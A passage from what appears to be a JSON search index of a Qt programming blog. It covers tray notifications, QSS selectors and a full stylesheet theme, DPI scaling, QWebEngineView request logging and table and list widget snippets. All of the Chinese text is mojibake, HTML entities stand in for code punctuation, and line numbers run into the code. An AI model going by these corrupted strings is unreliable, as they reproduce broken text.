çš„å•å‡»äº‹ä»¶ connect(trayIcon, SIGNAL(activated(QSystemTrayIcon::ActivationReason)), this, SLOT(stTrayIconActive(QSystemTrayIcon::ActivationReason))); //è®¾ç½®é€šçŸ¥æ çš„å³é”®èœå• QMenu * menu = new QMenu(); //è®¾ç½®èœå•é¡¹ç›® QAction *actionHide = new QAction(icon, &quot;Hide&quot;, menu); menu-&gt;addAction(actionHide); trayIcon-&gt;setContextMenu(menu); // è®¾ç½®Actionçš„å“åº” connect(actionHide, SIGNAL(triggered()), this, SLOT(stActionHide())); trayIcon-&gt;show(); //æ‰˜ç›˜çš„æ¶ˆæ¯æç¤º trayIcon-&gt;showMessage(&quot;title&quot;, &quot;this is a message&quot;, icon1);&#125;Widget::~Widget()&#123; delete ui;&#125;void Widget::stTrayIconActive(QSystemTrayIcon::ActivationReason acReason)&#123; switch (acReason) &#123; case QSystemTrayIcon::Trigger: &#123; showNormal(); break; &#125; default: ; &#125;&#125;void Widget::on_pushButton_clicked()&#123; QIcon icon = QApplication::style()-&gt;standardIcon((QStyle::StandardPixmap)0); QIcon icon1 = QApplication::style()-&gt;standardIcon((QStyle::StandardPixmap)9); if(ui-&gt;label-&gt;isVisible()) &#123; trayIcon-&gt;showMessage(&quot;æé†’&quot;, &quot;éšè—å›¾ç‰‡&quot;, icon1); ui-&gt;label-&gt;hide(); &#125; else &#123; trayIcon-&gt;showMessage(&quot;æé†’&quot;, &quot;æ˜¾ç¤ºå›¾ç‰‡&quot;, icon1); ui-&gt;label-&gt;setVisible(true); &#125;&#125; widget.ui ![UI](Qt Winæ¶ˆæ¯é€šçŸ¥/Qt Winæ¶ˆæ¯é€šçŸ¥2.png)","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"Qt","slug":"Qt","permalink":"https://hodlyounger.github.io/tags/Qt/"},{"name":"é€šçŸ¥","slug":"é€šçŸ¥","permalink":"https://hodlyounger.github.io/tags/%E9%80%9A%E7%9F%A5/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"}]},{"title":"ã€Qtã€‘ã€ä¸€æ–‡ææ‡‚ã€‘qss","date":"2023-10-27T01:24:02.236Z","path":"B_Code/Qt/ã€Qtã€‘Qss/","text":"Qss Qssçš„å†™æ³•å‚è€ƒcsså³å¯ã€‚ ç½‘ç«™æ¨èï¼š Qt Style Sheets Reference | Qt 4.8 ä¹¦ç±æ¨èï¼š ã€ŠQtæ ·å¼è‘µèŠ±å®å…¸ã€‹æå–ç ï¼šnod5 å·¥å…·æ¨èï¼š Qss Editor 0.6.1 æå–ç ï¼šyzbi Qss Stylesheet Editor 1.7 æå–ç ï¼š4r3i QssåŠ è½½çš„å¸¸è§„æ“ä½œ åœ¨èµ„æºæ–‡ä»¶å¤¹ä¸­æ·»åŠ style.qssçš„æ–‡ä»¶ ä»¥æ–‡ä»¶IOçš„æ–¹å¼è¯»å–å¹¶è®¾ç½®å³å¯ã€‚ è¯»å–çš„ä»£ç ï¼š 1234567891011121314151617181920void Widget::InitStyle(int i)&#123; m_LCD_Hour-&gt;setStyleSheet(&quot; font: 18px black;&quot;); if(i != 0) &#123; QFile file(QString(&quot;:/Assert/qss/style%1.qss&quot;).arg(i)); file.open(QFile::ReadOnly); this-&gt;setStyleSheet(file.readAll()); file.close(); return; &#125; // m_LCD_Min-&gt;setStyleSheet(&quot;color: black; &quot;); // m_LCD_Sec-&gt;setStyleSheet(&quot;color: black; &quot;); QFile file(QString(&quot;:/Assert/qss/main.qss&quot;)); file.open(QFile::ReadOnly); this-&gt;setStyleSheet(file.readAll()); file.close();&#125; æ„Ÿå…´è¶£çš„æœ‹å‹å¯ä»¥çœ‹çœ‹æˆ‘æ•´ç†çš„ä¸€äº›Qtå°é¡¹ç›®å¸¸ç”¨çš„ä¸€äº›ä»£ç ï¼š[ã€Qtã€‘å¸¸ç”¨åŸºç¡€ä»£ç æ±‡æ€»ï¼ˆéšæ—¶æ›´æ–°ï¼‰_æ¬§æ©æ„çš„åšå®¢-CSDNåšå®¢_qtä»£ç æ•´ç†]https://blog.csdn.net/Fuel_Ming/article/details/122830341) é€‰æ‹©å™¨ ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œåœ¨uiæ–‡ä»¶ä¸­çš„æ§ä»¶æœ‰æ•ˆï¼Œè€Œåœ¨ä»£ç ä¸­å£°æ˜çš„åˆ™æ— æ•ˆï¼Œå› ä¸ºQtæ˜¯æ ¹æ®objectNameæ¥è¯†åˆ«çš„ï¼Œæ‰€ä»¥è‡ªå·±å£°æ˜çš„æ§ä»¶éœ€è¦è®¾ç½®å¯¹è±¡åã€‚ 1m_btn-&gt;setObjectName(&quot;BtnOK&quot;); åœ¨QSSæ–‡ä»¶ä¸­ï¼š 1234567QPushButton#BtnOK&#123; color:white; background-color:rgb(0,112,210);&#125;QPushButton#BtnOK::hover&#123; background-color: rgb(0,134,252);&#125; é€šç”¨é€‰æ‹©å™¨ å³ * è¡¨ç¤ºçš„csså¯¹è±¡ã€‚ä½œç”¨äºæ‰€æœ‰çš„ç•Œé¢æ§ä»¶ 123* &#123; color: red;&#125; ç±»å‹é€‰æ‹©å™¨ ä½œç”¨äºè‡ªå·±åŠå­ç±» ç±»åï¼ˆQtç±»ï¼‰ä½œä¸ºé€‰æ‹©å™¨ï¼Œä½œç”¨äºå…¶è‡ªèº«å’Œä»–æ‰€æœ‰çš„å­ç±» 123QFrame &#123; background: gray;&#125; ä½¿ç”¨äº†ç±»å‹é€‰æ‹©å™¨ QFrameï¼Œæ‰€ä»¥ QFrame å’Œå®ƒçš„å­ç±» QLableï¼ŒQLCDNumberï¼ŒQTableWidget ç­‰çš„èƒŒæ™¯ä¼šæ˜¯ç°è‰²çš„ï¼ŒQPushButton ä¸æ˜¯ QFrame çš„å­ç±»ï¼Œæ‰€ä»¥ä¸å—å½±å“ã€‚åœ¨Qtçš„ç±»å›¾æˆ–è€…å¸®åŠ©æ‰‹å†Œä¸­å¯ä»¥çœ‹åˆ°ä¸€ä¸ªQtç±»çš„å­ç±»å’Œçˆ¶ç±»ã€‚ åªä½œç”¨äºè‡ªå·± å³ . + ç±»å çš„å½¢å¼ã€‚ä½œç”¨å¯¹è±¡åªæœ‰å®ƒè‡ªå·±ã€‚å­ç±»ä¸å—å½±å“ã€‚ 1234QWidget *window = new QWidget();window-&gt;setStylesheet(&quot;.QWidget &#123; &quot; &quot;color:red;&quot; &quot;&#125;&quot;); IDé€‰æ‹©å™¨ # + objectnameä½œä¸ºé€‰æ‹©å™¨ã€‚åªä½œç”¨äºæ­¤ objectname çš„å¯¹è±¡ï¼ˆå¤šä¸ªå¯¹è±¡å¯ä»¥è®¾ç½®åŒä¸€ä¸ª objectnameï¼Œä½†ä¸æ¨èè¿™ä¹ˆå†™ï¼‰ã€‚ 1234567891011121314QPushButton *btn = new QPushButton;// è®¾ç½®å±æ€§åbtn-&gt;setObjectName(&quot;openButton&quot;);// è®¾ç½®æ ·å¼// 1btn-&gt;setStylesheet(&quot;#openButton &#123; &quot; &quot;color:red;&quot; &quot;&#125;&quot;);// 2btn-&gt;setStylesheet(&quot;QPushButton#openButton &#123; &quot; &quot;color:red;&quot; &quot;&#125;&quot;); å±æ€§é€‰æ‹©å™¨ [å±æ€§ = å€¼]çš„å½¢å¼è®¾ç½®æ ·å¼ã€‚éœ€è¦é€šè¿‡object-&gt;property()æ¥å£è®¾ç½®Qtæ§ä»¶çš„å±æ€§å€¼ï¼ˆDynamic Propertiesï¼‰ã€‚ 12345app.setStyleSheet(&quot;.QWidget &#123; background: gray; &#125;&quot; &quot;QPushButton[level=\\&quot;dangerous\\&quot;] &#123; background: magenta; &#125;&quot;); openButton-&gt;setProperty(&quot;level&quot;, &quot;dangerous&quot;);closeButton-&gt;setProperty(&quot;level&quot;, &quot;dangerous&quot;); åŒ…å«é€‰æ‹©å™¨ ä¹Ÿå°±æ˜¯å¯¹æ§ä»¶å†…çš„æ§ä»¶çš„ç±»è¿›è¡Œè®¾ç½®ï¼Œä¸€çœ‹å°±æ‡‚ï¼Œé€‰æ‹©å™¨ä¹‹é—´ç”¨ç©ºæ ¼éš”å¼€ï¼ŒåŒ…å«é€‰æ‹©å™¨å’Œå­å…ƒç´ é€‰æ‹©å™¨éœ€è¦åŒºåˆ†ï¼š 12345678910QFrame &#123; background: gray;&#125; QFrame QPushButton &#123; border: 2px solid magenta; border-radius: 10px; background: white; padding: 2px 15px;&#125; å­å…ƒç´ é€‰æ‹©å™¨ é€‰æ‹©å™¨ä¹‹é—´ç”¨ &gt; éš”å¼€ï¼Œä½œç”¨äºWidgetçš„ ç›´æ¥ å­Widget 12345678910QFrame &#123; background: gray;&#125; QFrame &gt; QPushButton &#123; border: 2px solid magenta; border-radius: 10px; background: white; padding: 2px 15px;&#125; ä¼ªç±»é€‰æ‹©å™¨ é€‰æ‹©å™¨:çŠ¶æ€ ä½œä¸ºé€‰æ‹©å™¨ã€‚æ”¯æŒ!æ“ä½œã€‚ 123QPushButton:hover &#123; color: white &#125;QCheckBox:checked &#123; color: white &#125;QCheckBox:!checked &#123; color: red &#125; å¸¸è§çš„ä¼ªç±»é€‰æ‹©å™¨å¦‚ä¸‹æ‰€ç¤ºï¼š ä¼ªç±» è¯´æ˜ :disabled Widget è¢«ç¦ç”¨æ—¶ :enabled Widget å¯ä½¿ç”¨æ—¶ :focus Widget å¾—åˆ°è¾“å…¥ç„¦ç‚¹ :hover é¼ æ ‡æ”¾åˆ° Widget ä¸Š :pressed é¼ æ ‡æŒ‰ä¸‹æ—¶ :checked è¢«é€‰ä¸­æ—¶ :unchecked æœªé€‰ä¸­æ—¶ :has-children Item æœ‰å­ itemï¼Œä¾‹å¦‚ QTreeView çš„ item æœ‰å­ item æ—¶ :has-siblings Item æœ‰ å…„å¼Ÿï¼Œä¾‹å¦‚ QTreeView çš„ item æœ‰å…„å¼Ÿ item æ—¶ :open æ‰“å¼€æˆ–å±•å¼€çŠ¶æ€ï¼Œä¾‹å¦‚ QTreeView çš„ item å±•å¼€ï¼ŒQPushButton çš„èœå•å¼¹å‡ºæ—¶ :closed å…³é—­æˆ–è€…éå±•å¼€çŠ¶æ€ :on Widget çŠ¶æ€æ˜¯å¯åˆ‡æ¢çš„ï¼ˆtoggleï¼‰, åœ¨ on çŠ¶æ€ :off Widget çŠ¶æ€æ˜¯å¯åˆ‡æ¢çš„ï¼ˆtoggleï¼‰, åœ¨ off çŠ¶æ€ SubControlé€‰æ‹©å™¨ é€‰æ‹©å™¨::subcontrol ä½œä¸ºé€‰æ‹© Subcontrol çš„é€‰æ‹©å™¨ã€‚ æœ‰äº› Widget æ˜¯ç”±å¤šä¸ªéƒ¨åˆ†ç»„åˆæˆçš„ï¼Œä¾‹å¦‚ QCheckBox ç”± icon(indicator) å’Œ text ç»„æˆï¼Œå¯ä»¥ä½¿ç”¨ é€‰æ‹©å™¨::subcontrol æ¥è®¾ç½® subcontrol çš„æ ·å¼ï¼š 12345678QCheckBox::indicator &#123; width: 20px; height: 20px;&#125;QCheckBox &#123; spacing: 8px;&#125; å¸¸ç”¨çš„ Subcontrol æœ‰ï¼š Subcontrol è¯´æ˜ ::indicator A QCheckBox, QRadioButton, checkable QMenu item, or a checkable QGroupBoxâ€™s indicator ::menu-indicator A QPushButtonâ€™s menu indicator ::item A QMenu, QMenuBar, or QStatusBarâ€™s item ::up-button A QSpinBox or QScrollBarâ€™s up button ::down-button A QSpinBox or QScrollBarâ€™s down button ::up-arrow A QSpinBox, QScrollBar, or QHeaderViewâ€™s up arrow ::down-arrow A QSpinBox, QScrollBar, or QHeaderViewâ€™s down arrow ::drop-down A QComboBoxâ€™s drop-down arrow ::title A QGroupBox or QDockWidgetâ€™s title ::groove A QSliderâ€™s groove ::chunk A QProgressBarâ€™s progress chunk ::branch A QTreeViewâ€™s branch indicator è¡¥å…… ä¸€äº›å…¶ä»–å†™æ³•çš„å‚è€ƒdemo 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448/* ================================================ *author:leilastedited:2020.2* ================================================ */$text = #222;$background = #FDFDFD;$border = #999999;$selected = #8BF; /*hover*/$pressed = #59F;$focused = #EA2; /*actived*/$grad1a = #EEEEEF; /*gradient start*/$grad1b = #DADADF; /*gradient end*/QWidget&#123; color: $text; background-color: $background;&#125;QFrame&#123; color: $text; background-color: $background;/*ä¸èƒ½è®¾ç½®ä¸ºtransparent*/&#125;QMainWindow::separator&#123; border: 1px solid $border; border-style: outset; width: 4px; height: 4px;&#125;QMainWindow::separator:hover&#123; background: $selected;&#125;QSplitter::handle&#123; border: 1px solid $border; border-style: outset; width: 4px; height: 4px;&#125;QSplitter::handle:hover&#123;/*splitter-&gt;handle(1)-&gt;setAttribute(Qt::WA_Hover, true);æ‰ç”Ÿæ•ˆ*/ border-color: $focused;&#125;QSplitter::handle:pressed&#123; border-color: $pressed;&#125;QSizeGrip&#123; background-color: none;&#125;/* =============================================== *//* Label *//* =============================================== */QLabel &#123; background: transparent; border: 1px solid transparent; padding: 1px;&#125;/* A QLabel is a QFrame ... *//* A QToolTip is a QLabel ... */QToolTip &#123; border: 1px solid $border; padding: 5px; border-radius: 3px; opacity:210;&#125;/* =============================================== *//* TextBox *//* =============================================== */QLineEdit &#123; background: $background;/*ä¸å»ºè®®è®¾ä¸ºé€æ˜ï¼Œå¦åˆ™tableç¼–è¾‘æ—¶ä¼šå­—æ˜¾ç¤º*/ selection-background-color: $selected; border: 1px solid $border; border-radius: 2px; border-style: inset; padding: 0 1px;&#125;QLineEdit:hover&#123; border-color: $selected;&#125;QLineEdit:focus&#123; border-color: $focused;&#125;/*QLineEdit[readOnly=&quot;true&quot;] &#123; color: gray &#125;*/QLineEdit[echoMode=&quot;2&quot;]&#123; lineedit-password-character: 9679;/*å­—ç¬¦çš„asciiç 35 88ç­‰ */&#125;QLineEdit:read-only &#123; color: lightgray;&#125;QLineEdit:disabled&#123; color: lightgray; background: lightgray;&#125;QTextEdit&#123; selection-background-color:$selected; border: 1px solid $border; border-style: inset;&#125;QTextEdit:hover&#123; border-color: $selected;&#125;QTextEdit:focus&#123; border-color: $focused;&#125;/* =============================================== *//* Button *//* =============================================== */QPushButton &#123; border: 1px solid $border; border-radius: 2px; /*background-color: QLinearGradient( x1: 0, y1: 0, x2: 0, y2: 1, stop: 0 $grad1a, stop: 0.05 $grad1b,stop: 0.5 $grad1b, stop: 0.9 $grad1a, stop: 1 $grad1a);*/ padding: 1px 4px; min-width: 50px; min-height: 16px;&#125;QPushButton:hover&#123; background-color: $selected; border-color: $pressed;&#125;QPushButton:pressed&#123; border-width: 1px; background-color: $pressed; border-color: $border;&#125;QPushButton:focus, QPushButton:default &#123; border-color: $focused; /* make the default button prominent */&#125;QToolButton,QToolButton:unchecked &#123; /* ToolBaré‡Œçš„æŒ‰é’®å’Œå¸¦ä¸‹æ‹‰èœå•çš„æŒ‰é’® */ border: 1px solid transparent; border-radius: 3px; background-color: transparent; margin: 1px;&#125;QToolButton:checked&#123; background-color: $selected; border-color: $pressed;&#125;QToolButton:hover&#123; background-color: $selected; border-color: $pressed;&#125;QToolButton:pressed,QToolButton:checked:hover&#123; background-color: $pressed; border-color: $focused;&#125;QToolButton:checked:pressed&#123; background-color: $selected;&#125;/* only for MenuButtonPopup */QToolButton[popupMode=&quot;1&quot;]&#123; padding-left: 1px; padding-right: 15px; /* make way for the popup button */ border: 1px solid $border; min-height: 15px; /*background: qlineargradient(x1:0, y1:0 ,x2:0, y2:1 stop: 0 $grad1a, stop: 0.05 $grad1b, stop: 0.5 $grad1b stop: 0.95 $grad1a stop: 1$grad1a)*/&#125;QToolButton[popupMode=&quot;1&quot;]:hover&#123; background-color: $selected; border-color: $pressed;&#125;QToolButton[popupMode=&quot;1&quot;]:pressed&#123; border-width: 1px; background-color: $pressed; border-color: $border;&#125;QToolButton::menu-button &#123; border: 1px solid $border; border-top-right-radius: 2px; border-bottom-right-radius: 2px; width: 16px;&#125;/* =============================================== *//* Slider ProgressBar *//* =============================================== */QProgressBar &#123; border: 1px solid $border; border-radius: 4px; text-align: center;&#125;QProgressBar::chunk &#123; background-color: $focused; width: 4px; margin: 1px;&#125;QSlider&#123; border: 1px solid transparent;&#125;QSlider::groove&#123; border: 1px solid $border; background: $background;&#125;QSlider::handle &#123;/*è®¾ç½®ä¸­é—´çš„é‚£ä¸ªæ»‘åŠ¨çš„é”®*/ border: 1px solid $border; background: $selected;&#125;QSlider::groove:horizontal &#123; height: 3px; /* the groove expands to the size of the slider by default. by giving it a height, it has a fixed size */ left:5px; right: 5px;&#125;QSlider::groove:vertical&#123; width: 3px; top: 5px; bottom: 5px;&#125;QSlider::handle:horizontal&#123; width: 6px; margin: -7px; /* height */&#125;QSlider::handle:vertical&#123; height: 6px; margin: -7px; /* height */&#125;QSlider::add-page&#123;/*è¿˜æ²¡æœ‰æ»‘ä¸Šå»çš„åœ°æ–¹*/ border: 1px solid $border; background:$grad1a;&#125;QSlider::sub-page&#123;/*å·²ç»åˆ’è¿‡çš„ä»åœ°æ–¹*/ background: $focused;&#125;/* =============================================== *//* ScrollBar *//* =============================================== */QScrollBar&#123; background-color: $background; border: 1px solid $border; border-radius: 5px; padding: 1px; height: 10px; width: 10px;&#125;QScrollBar:hover&#123; border-color:$selected;&#125;QScrollBar::handle&#123; border-radius: 3px; background: $pressed; min-width: 16px; min-height: 16px;&#125;QScrollBar::handle:hover &#123; background: $focused;&#125;QScrollBar::add-line, QScrollBar::sub-line,QScrollBar::add-page, QScrollBar::sub-page &#123; width: 0px; background: transparent;&#125;QScrollArea&#123; border: none;&#125;/*QScrollArea QAbstractSlider&#123; border-radius: 0px;&#125;*//* =============================================== *//* DockWidget *//* =============================================== */QDockWidget, QDockWidget &gt; QWidget/*not work*/&#123; border-color: $border;/*qt bug*/ background: transparent;&#125;QDockWidget::title &#123; border-bottom: 1px solid $border; border-style: inset; text-align: left; /* align the text to the left */ padding: 6px;&#125;/* =============================================== *//* GroupBox *//* =============================================== */QGroupBox &#123; background-color: $background; border: 1px solid $border; border-radius: 4px; margin-top: 0.5em;&#125;QGroupBox::title &#123; subcontrol-origin: margin; subcontrol-position: top left; left: 1em; top: 0.1em; background-color: $background;&#125;/* =============================================== *//* ToolBox *//* =============================================== */QToolBox&#123; border: 1px solid $border;&#125;QToolBox::tab &#123; background: $grad1a; border: 1px solid $border; border-radius: 1px;&#125;QToolBox::tab:hover &#123; background-color: $selected; border-color: transparent;&#125;QToolBox::tab:pressed &#123; background-color: $pressed; border-color: transparent;&#125;QToolBox::tab:selected &#123; font-weight: bold; border-color: $selected;&#125;/* =============================================== *//* TabWidget *//* =============================================== */QTabWidget&#123; margin-top:10px;&#125;QTabWidget::pane&#123; border: 1px solid $border;&#125;QTabWidget::tab-bar &#123; left: 0px;&#125;QTabBar::tab &#123; background: $background; border: 1px solid $border; padding: 3px 5px; &#125;QTabBar::tab:hover &#123; background: $selected; border-color: transparent;&#125;QTabBar::tab:selected &#123; background: $selected; border-color: $pressed;&#125;QTabBar::tab:pressed &#123; background: $pressed; border-color: transparent;&#125;QTabBar::tab:focus &#123; border-color: $focused;&#125;QTabBar::tab:top&#123; margin-top: 3px; border-bottom: transparent; margin-right: 1px;&#125;QTabBar::tab:bottom&#123; margin-bottom: 3px; border-top: transparent; margin-right: 1px;&#125;QTabBar::tab:left&#123; border-right: transparent; margin-bottom: 1px;&#125;QTabBar::tab:right&#123; border-left: transparent; margin-bottom: 1px;&#125;/* =============================================== *//* QHeaderView for list table *//* =============================================== */QHeaderView &#123; border: none; margin: 0px; padding: 0px;&#125;QHeaderView::section, QTableCornerButton::section &#123;/*è®¾ç½®è¡¨å¤´å±æ€§*//*å·¦ä¸Šè§’*/ background-color: $grad1a; padding: 0 3px; border-right: 1px solid $border; border-bottom: 1px solid $border; border-radius: 0px;&#125;QHeaderView::section:hover, QTableCornerButton::section:hover&#123; background-color: $selected;&#125;QHeaderView::section:pressed&#123; background-color: $pressed;&#125;QHeaderView::section:checked &#123; background-color: $focused;&#125;/* =============================================== *//* QTableWidget *//* =============================================== */QTableWidget, QTableView&#123; gridline-color: $border; /*è¡¨æ ¼ä¸­çš„ç½‘æ ¼çº¿æ¡é¢œè‰²*/ background: $background; /*è®¾ç½®äº¤æ›¿é¢œè‰²ï¼Œéœ€è¦åœ¨å‡½æ•°å±æ€§ä¸­è®¾ç½®:tableWidget-&gt;setAlternatingRowColors(true)*/ alternate-background-color: $grad1a; /*selection-color:$background; é¼ æ ‡é€‰ä¸­æ—¶å‰æ™¯è‰²ï¼šæ–‡å­—é¢œè‰²*/ selection-background-color:$selected; /*é¼ æ ‡é€‰ä¸­æ—¶èƒŒæ™¯è‰²*/ border:1px solid $border; /*è¾¹æ¡†çº¿çš„å®½åº¦ã€é¢œè‰²*/ /*border:none; å»é™¤è¾¹ç•Œçº¿*/ /*border-radius:5px;*/ /*padding:10px 10px;*/ /*è¡¨æ ¼ä¸è¾¹æ¡†çš„é—´è·*/&#125;QTableView::item, QTabWidget::item&#123; background: transparent; outline-style: none; border: none;&#125;QTableView::item:hover &#123; background: $selected; border: 1px solid $focused;&#125;QTableView::item:selected &#123; background: $selected; color: $grad1a;&#125;QTableView::item:selected:active &#123; background: $pressed; color: $grad1a;&#125;QTableWidget QComboBox&#123; margin: 2px; border: none;&#125;","tags":[{"name":"Qt","slug":"Qt","permalink":"https://hodlyounger.github.io/tags/Qt/"},{"name":"css","slug":"css","permalink":"https://hodlyounger.github.io/tags/css/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"}]},{"title":"ã€Qtã€‘çª—å£é€‚é…ç³»ç»Ÿç¼©æ”¾","date":"2023-10-27T01:24:02.235Z","path":"B_Code/Qt/QWin/ã€Qtã€‘çª—å£é€‚é…ç³»ç»Ÿç¼©æ”¾/","text":"ä»£ç  1234567891011121314151617181920212223struct DpiCompatible&#123; static double GetDpiScale() &#123; double dDpi = 1.0; HDC desktopDc = GetDC(NULL); float horizontalDPI = GetDeviceCaps(desktopDc, LOGPIXELSX); float verticalDPI = GetDeviceCaps(desktopDc, LOGPIXELSY); int dpi = (horizontalDPI + verticalDPI) / 2; dDpi = 1 + ((dpi - 96) / 24) * 0.25; if (dDpi &lt; 1) &#123; dDpi = 1; &#125; ReleaseDC(NULL, desktopDc); return dDpi; &#125; static void InitQtDPICompatible() &#123; SetProcessDPIAware(); qputenv(&quot;QT_SCALE_FACTOR&quot;, QString::number(GetDpiScale()).toLatin1()); &#125;&#125;; ä½¿ç”¨ 12//è®¾ç½®è¯¥å±æ€§è§£å†³åœ¨ä¸åŒç¼©æ”¾æ¯”ä¾‹çš„æ˜¾ç¤ºå™¨ä¹‹é—´ç§»åŠ¨æ—¶å¸ƒå±€æ··ä¹±å’Œä¸è·Ÿéšwindowsç³»ç»Ÿç¼©æ”¾çš„é—®é¢˜DpiCompatible::InitQtDPICompatible();","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"Qt","slug":"Qt","permalink":"https://hodlyounger.github.io/tags/Qt/"},{"name":"ç¼©æ”¾","slug":"ç¼©æ”¾","permalink":"https://hodlyounger.github.io/tags/%E7%BC%A9%E6%94%BE/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"},{"name":"QWin","slug":"B-Code/Qt/QWin","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/QWin/"}]},{"title":"ã€Qtã€‘ä½¿ç”¨ QWebEngineView åŠ è½½ç½‘é¡µæ…¢çš„é—®é¢˜","date":"2023-10-27T01:24:02.233Z","path":"B_Code/Qt/QWebEngineView/ã€Qtã€‘ç½‘é¡µåŠ è½½æ…¢/","text":"[toc] å®šä½ æŠŠ QWebEngineview å‘èµ·çš„æ¯ä¸ªç½‘ç»œè¯·æ±‚å…¨éƒ¨æ‰“å°ï¼Œçœ‹çœ‹æ˜¯å“ªä¸ªè¯·æ±‚æ…¢ï¼š é‡å†™ QWebEngineUrlRequestInterceptor 123456789101112131415161718192021class CustomUrlRequestInterceptor : public QWebEngineUrlRequestInterceptor&#123;public: CustomUrlRequestInterceptor(QObject* parent = nullptr) : QWebEngineUrlRequestInterceptor(parent) &#123;&#125; void interceptRequest(QWebEngineUrlRequestInfo&amp; info) override &#123; // å¯åœ¨å‘é€è¯·æ±‚å‰å¯¹URLè¿›è¡Œä¿®æ”¹ if (info.requestUrl().host() == &quot;www.example.com&quot;) &#123; QUrl newUrl = info.requestUrl(); newUrl.setHost(&quot;www.newexample.com&quot;); info.setUrl(newUrl); &#125; // å¯æ·»åŠ è‡ªå®šä¹‰Header info.setHttpHeader(&quot;User-Agent&quot;, &quot;Custom User-Agent&quot;); // æ‰“å°æ—¥å¿— LogUtils::info(info.requestUrl().toString().toStdString().c_str());//è¾“å‡ºæ—¥å¿— &#125;&#125;; å…³é—­ç³»ç»Ÿä»£ç† è®¾ç½®å…³é—­ç³»ç»Ÿè‡ªåŠ¨ä»£ç†å³å¯ï¼š 1QNetworkProxyFactory::setUseSystemConfiguration(false);","tags":[{"name":"Qt/QWebEngineView","slug":"Qt-QWebEngineView","permalink":"https://hodlyounger.github.io/tags/Qt-QWebEngineView/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"},{"name":"QWebEngineView","slug":"B-Code/Qt/QWebEngineView","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/QWebEngineView/"}]},{"title":"ã€Qtã€‘çª—ä½“ä¸æ˜¾ç¤ºæˆ–åŠé€æ˜","date":"2023-10-27T01:24:02.232Z","path":"B_Code/Qt/QWebEngineView/ã€Qtã€‘çª—ä½“ä¸æ˜¾ç¤ºæˆ–çª—ä½“åŠé€æ˜/","text":"ä½¿ç”¨ QWebEnginueView æ§ä»¶åï¼Œå¦‚æœçˆ¶çª—ä½“è®¾ç½®äº†ä¸€ä¸‹å±æ€§ï¼Œå°±ä¼šå¯¼è‡´çª—å£ä¸æ˜¾ç¤ºæˆ–åŠé€æ˜ã€‚ 12setWindowFlags(Qt::FramelessWindowHint);setAttribute(Qt::WA_TranslucentBackground); è§£å†³åŠæ³•ï¼š QWebEngineViewåœ¨é¡¶å±‚çª—å£ä¸ºé€æ˜æ— æ ‡é¢˜æ çš„æƒ…å†µä¸‹æœ‰é—®é¢˜_shanqlçš„åšå®¢-CSDNåšå®¢","tags":[{"name":"Qt/QWebEngineView","slug":"Qt-QWebEngineView","permalink":"https://hodlyounger.github.io/tags/Qt-QWebEngineView/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"},{"name":"QWebEngineView","slug":"B-Code/Qt/QWebEngineView","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/QWebEngineView/"}]},{"title":"ã€Qtã€‘QTableWidget éå†","date":"2023-10-27T01:24:02.231Z","path":"B_Code/Qt/QTableWidget/ã€Qtã€‘QTableWidgetéå†/","text":"123456789101112for(int row=0; row&lt;ui-&gt;tableWidget-&gt;rowCount(); row++)&#123; for(int col=0; col&lt;ui-&gt;tableWidget-&gt;columnCount(); col++) &#123; QTableWidgetItem* item = ui-&gt;tableWidget_right-&gt;item(row,col); &#125;&#125;for(int row=0; row&lt;ui-&gt;tableWidget-&gt;rowCount(); row++)&#123; QTableWidgetItem* item = ui-&gt;tableWidget_right-&gt;item(row,0);&#125;","tags":[{"name":"Qt/QTableWidget","slug":"Qt-QTableWidget","permalink":"https://hodlyounger.github.io/tags/Qt-QTableWidget/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"},{"name":"QTableWidget","slug":"B-Code/Qt/QTableWidget","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/QTableWidget/"}]},{"title":"ã€Qtã€‘QListWidget ç”¨æ³•æ•´ç†","date":"2023-10-27T01:24:02.229Z","path":"B_Code/Qt/ã€Qtã€‘QListWidget ç”¨æ³•æ•´ç†/","text":"è®¾ç½®æ˜¾ç¤ºæ¨¡å¼ 12QListView::ListModeQListView::IconMode è°ƒç”¨æ¥å£ï¼š 1setViewMode(QListWidget::IconMode); //æ˜¾ç¤ºæ¨¡å¼ 